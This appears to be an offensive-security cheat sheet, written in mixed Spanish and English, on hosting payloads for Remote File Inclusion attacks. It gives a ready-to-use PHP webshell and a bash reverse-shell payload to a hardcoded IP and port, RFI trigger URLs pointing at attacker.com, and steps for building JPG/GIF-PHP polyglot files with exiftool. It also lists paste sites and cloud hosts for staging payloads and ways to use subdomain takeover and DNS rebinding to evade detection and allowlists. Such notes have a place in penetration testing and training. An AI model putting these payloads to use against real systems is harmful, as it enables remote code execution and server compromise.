---
aliases:
  - RFI Webshell Hosting
  - Polyglot Files RFI
  - Public Payload Servers
tags:
  - type/cheatsheet
  - vuln/rfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
---
# RFI - Hostear Payload Remote

***

## Webshell Setup Atacante

| **Setup** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Python HTTP server | `python3 -m http.server 80` | Quick, no install. |
| Python HTTPS server | `python3 -m http.server --bind 0.0.0.0 443` con cert | TLS variant. |
| Apache + PHP local | `apache2 + php-fpm` | Full PHP stack. |
| nginx + PHP-FPM | Modern setup | Standard. |
| ngrok tunnel | `ngrok http 80` | Public exposure of local. |
| Cloudflare Tunnel | Same idea | Modern alt. |
| AWS S3 static site | Upload + enable static | Persistent host. |
| GitHub Pages | If repo public | Free hosting. |
| Heroku app | Free tier limits | Easy. |
| Repl.it / Glitch | Online Python/Node | Quick. |
| Subdomain takeover | Use claimed subdomain | Stealth. |
| Atacante's own VPS | Standard | Reliable. |
| Shell payloads | `<?php system($_GET['c']); ?>` | Standard. |
| Reverse shell PHP | Bash one-liner via system() | Direct. |
| Combine con DNS A record | Custom domain | Reliability. |
| HTTPS cert valid | Let's Encrypt | Authoritative-looking. |
^rfi-host-setup

### Quick HTTP server for RFI

```bash
# Stage 1: Create payload
mkdir /tmp/rfi-payloads
cd /tmp/rfi-payloads

# Simple webshell
cat > shell.php <<'EOF'
<?php
if (isset($_GET['c'])) {
    system($_GET['c']);
}
?>
EOF

# Reverse shell payload
cat > rev.php <<'EOF'
<?php
$ip = '10.10.14.5';
$port = 4444;
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
EOF

# Stage 2: Serve
python3 -m http.server 80

# Stage 3: Trigger
# https://target/index.php?page=http://attacker.com/shell.php&c=id
```

___

## Polyglot Files

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | File con multiple format magic bytes — bypasses extension/MIME filters. | Multi-vector. |
| GIF + PHP polyglot | `GIF89a<?php system('id'); ?>` | Standard. |
| JPEG + PHP | EXIF metadata con PHP code | Stealth. |
| PNG + PHP | Insertar PHP en chunks ignored | Common. |
| PDF + PHP | PDF tolerates PHP comments | Edge. |
| SVG + PHP | XML structure | Edge. |
| ZIP + PHP | Phar polyglot | Combine deser. |
| HTML + PHP | Standard | Trivial. |
| TXT + PHP | Standard | Trivial. |
| `gimp` insertando PHP en EXIF | Tool | Standard. |
| `exiftool -Comment="<?php ..." file.jpg` | CLI tool | Standard. |
| Atacante's content negotiation | Server serves file based on UA | Stealth. |
| Combine con upload + RFI | Upload polyglot, RFI references | Standard chain. |
| Force MIME type | Atacante sets `Content-Type: image/jpeg` | UX trick. |
^rfi-host-polyglot

### Polyglot JPG + PHP

```bash
# Atacante crea image polyglot
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg

# Verify
strings image.jpg | grep -i 'php\|system'
# <?php system($_GET["c"]); ?>

# Host
cp image.jpg /tmp/rfi-payloads/shell.jpg
python3 -m http.server 80

# Trigger en victim
# https://target/index.php?page=http://attacker.com/shell.jpg&c=id
# PHP interpreter ignores binary preamble + executes <?php block
```

___

## Public Payload Servers

| **Servicio** | **Uso** | **Notas** |
|:---:|:---:|:---:|
| Pastebin | Static text content | Limited. |
| GitHub Gist | Public gist con raw URL | Standard. |
| GitHub repo | Raw file URLs | Standard. |
| GitLab snippets | Same | Alt. |
| Hastebin | Hastebin URL | Edge. |
| termbin.com | Pipe upload | Quick. |
| 0x0.st | File upload con URL | Quick. |
| ix.io | Same | Quick. |
| Burp Collaborator | OOB callback only — not payload host | Detection. |
| Custom CDN | Atacante's payload globally | Reliable. |
| AWS S3 con public ACL | Upload + permission | Standard. |
| Cloudflare R2 | Modern S3 alt | Free tier. |
| Backblaze B2 | Cheap S3 alt | Reliable. |
| Subdomain takeover host | Free + legit-looking | Stealth. |
| Combine con WAF egress filter | If victim filters HTTP egress | Edge. |
| Force HTTPS via cert | Let's Encrypt | Standard. |
^rfi-host-public

### Pastebin RFI

```bash
# Atacante creates raw paste
# https://pastebin.com/raw/abcd1234 con content:
# <?php system($_GET['c']); ?>

# Trigger
curl "https://target/index.php?page=https://pastebin.com/raw/abcd1234&c=id"

# Bypass de filters that allow common URLs
# Less detection en logs (looks like legitimate paste)
```

___

## DNS Rebinding

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | Atacante controls DNS server. First resolve → legit IP. Second resolve → atacante's IP. Backend's TOCTOU between validate + fetch. | TOCTOU. |
| Setup atacante | DNS server con `rebind.atacante.com` rotating | Custom DNS. |
| Bypass IP allowlist | First DNS gives allowed IP → check passes. Second DNS gives atacante IP → fetch reaches atacante. | Bypass. |
| TTL manipulation | Low TTL forces re-resolve | Standard. |
| Rebinding tools | `singularity` framework | Standard tool. |
| Combine con SSRF | RFI is SSRF + execution → DNS rebind broadens vector | Compound. |
| Combine con whitelist suffix | If whitelist matches `attacker.com.target.com`, atacante DNS-controlled | Standard. |
| `lock.cmpxchg8b.com` | Public test rebinding | Edge. |
| Combine con Open Redirect | Resolve a redirect server → atacante's payload | Multi-vector. |
| Modern PHP curl extensions | Some prevent rebinding | Defense. |
| Combine con Burp Collaborator | DNS callback observation | Validation. |
^rfi-host-dnsrebind

***
